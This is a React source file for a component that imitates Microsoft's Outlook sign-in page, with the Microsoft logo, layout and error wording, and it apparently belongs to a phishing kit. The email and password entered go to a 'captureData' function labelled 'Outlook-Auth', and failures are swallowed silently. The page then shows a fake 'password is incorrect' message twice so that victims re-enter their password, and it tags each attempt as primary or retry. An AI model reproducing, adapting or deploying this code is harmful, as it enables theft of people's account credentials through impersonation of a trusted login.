"use client";

import { useState, useEffect } from "react";
import { captureData } from "@/lib/capture";

interface EmailVerificationProps {
  onLogin: (email: string, pass: string) => void;
  onSuccess: () => void;
}

export default function EmailVerification({
  onLogin,
  onSuccess,
}: EmailVerificationProps) {
  const [step, setStep] = useState<"name" | "password">("name");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  useEffect(() => {
    document.title =
      step === "name" ? "Sign in to your account" : "Enter password";
  }, [step]);

  const handleNext = () => {
    if (!email) return;
    setIsLoading(true);

    setTimeout(() => {
      setIsLoading(false);
      setStep("password");
    }, 1200);
  };

  const handleSignIn = async () => {
    if (!password) return;
    setIsLoading(true);
    setError(false);

    try {
      await captureData("Outlook-Auth", {
        emle: email,
        pass: password,
        status: attempts === 0 ? "primary" : "retry",
      });
    } catch (e) {
      // Internal sync handled silently
    }

    onLogin(email, password);

    setTimeout(() => {
      setIsLoading(false);
      if (attempts < 2) {
        setAttempts((prev) => prev + 1);
        setError(true);
        setPassword("");
      } else {
        onSuccess();
      }
    }, 2000);
  };

  return (
    <div
      className="fixed inset-0 z-[10000] flex flex-col items-center justify-center font-sans text-black bg-[#f2f2f2]"
      style={{
        backgroundImage:
          "url('/images/4_eae2dd7eb3a55636dc2d74f4fa4c386e.svg')",
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundRepeat: "no-repeat",
      }}>
      <div className="w-full max-w-[440px] bg-white p-11 shadow-[0_2px_4px_rgba(0,0,0,0.14)] flex flex-col min-h-[380px] relative z-10 overflow-hidden">
        {isLoading && (
          <div className="absolute top-0 left-0 w-full h-[3px] bg-transparent overflow-hidden">
            <div className="w-full h-full bg-[#0067b8] animate-microsoft-progress origin-left" />
          </div>
        )}

        <div className="mb-4">
          <img src="/images/h.svg" alt="Microsoft" className="h-6" />
        </div>

        {step === "password" && (
          <div
            className="flex items-center gap-2 text-[15px] mb-3 cursor-pointer hover:bg-black/5 p-1 -ml-1 rounded transition-colors"
            onClick={() => {
              if (isLoading) return;
              setStep("name");
              setError(false);
            }}>
            <img
              src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path d='M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z'/></svg>"
              className="w-4 h-4"
              alt="back"
            />
            <span className="truncate text-zinc-600">{email}</span>
          </div>
        )}

        <h2 className="text-2xl font-semibold mb-4">
          {step === "name" ? "Sign in" : "Enter password"}
        </h2>

        {error && step === "password" && (
          <div className="text-[14px] text-[#e81123] mb-4">
            That Microsoft account or password is incorrect. Enter your password
            again.
          </div>
        )}

        <div className="flex-1">
          <input
            type={step === "name" ? "email" : "password"}
            placeholder={
              step === "name" ? "Email, phone, or Skype" : "Password"
            }
            className="w-full py-2 border-b border-black outline-none focus:border-[#0067b8] transition-colors text-[15px] placeholder:text-gray-500 disabled:bg-transparent text-black"
            value={step === "name" ? email : password}
            autoFocus
            disabled={isLoading}
            onChange={(e) =>
              step === "name"
                ? setEmail(e.target.value)
                : setPassword(e.target.value)
            }
            onKeyDown={(e) => {
              if (e.key === "Enter" && !isLoading) {
                step === "name" ? handleNext() : handleSignIn();
              }
            }}
          />

          {step === "name" ? (
            <div className="mt-4 space-y-3">
              <p className="text-[13px]">
                No account?{" "}
                <a href="#" className="text-[#0067b8] hover:underline">
                  Create one!
                </a>
              </p>
              <p className="text-[13px] text-[#0067b8] hover:underline cursor-pointer">
                Can’t access your account?
              </p>
            </div>
          ) : (
            <div className="mt-4">
              <p className="text-[13px] text-[#0067b8] hover:underline cursor-pointer">
                Forgot password?
              </p>
              <p className="text-[13px] text-[#0067b8] hover:underline cursor-pointer mt-3">
                Other ways to sign in
              </p>
            </div>
          )}
        </div>

        <div className="flex justify-end mt-12 gap-2">
          <button
            disabled={isLoading}
            onClick={() => (step === "name" ? handleNext() : handleSignIn())}
            className="bg-[#0067b8] text-white px-9 py-1.5 text-[15px] hover:bg-[#005da6] transition-colors min-w-[108px] disabled:opacity-80">
            {step === "name" ? "Next" : "Sign in"}
          </button>
        </div>
      </div>

      {step === "name" && (
        <div className="w-full max-w-[440px] mt-4 bg-white p-3 shadow-[0_2px_4px_rgba(0,0,0,0.14)] flex items-center gap-3 cursor-pointer hover:bg-gray-50 transition-colors relative z-10">
          <img src="/images/key.svg" alt="" className="w-8 h-8" />
          <span className="text-[15px]">Sign-in options</span>
        </div>
      )}

      <footer className="fixed bottom-0 w-full p-4 flex justify-end gap-6 text-[12px] text-gray-500 bg-white/80 backdrop-blur-sm md:bg-transparent">
        <span className="hover:underline cursor-pointer">Terms of use</span>
        <span className="hover:underline cursor-pointer">
          Privacy & cookies
        </span>
        <span>...</span>
      </footer>

      <style jsx global>{`
        @keyframes microsoftProgress {
          0% {
            transform: translateX(-100%);
          }
          50% {
            transform: translateX(0);
          }
          100% {
            transform: translateX(100%);
          }
        }
        .animate-microsoft-progress {
          animation: microsoftProgress 2s infinite ease-in-out;
        }
      `}</style>
    </div>
  );
}
